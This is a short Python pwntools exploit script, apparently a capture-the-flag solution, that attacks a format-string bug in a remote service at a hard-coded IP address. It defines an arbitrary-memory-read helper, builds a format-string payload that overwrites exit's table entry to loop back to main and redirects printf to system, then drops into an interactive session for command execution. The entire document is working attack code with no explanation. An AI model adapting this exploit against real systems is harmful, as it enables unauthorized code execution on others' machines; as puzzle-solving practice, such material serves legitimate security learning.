#!/usr/bin/python
from pwn import *
from libformatstr import FormatStr
OFFSET = 10
SYSTEM = 0x08048570
EXIT = 0x0804a034
PRINTF = 0x0804a02c
MAIN_GETS = 0x0804876c

#r = remote("localhost", 2015)
r = remote("163.172.176.29", 9035)
print r.recv(1024)

def read_addr(addr):
    a = p32(addr)
    r.send(a + "$10%s" + "\n")
    r.recvuntil("Bye")
    res = r.recv()
    print res

p = FormatStr()
p[EXIT] = MAIN_GETS
p[PRINTF] = SYSTEM
payload = p.payload(10, start_len=70)
raw_input("wait")
r.send(payload +"\n")
#At this point, we have a successful loop back around

r.interactive()
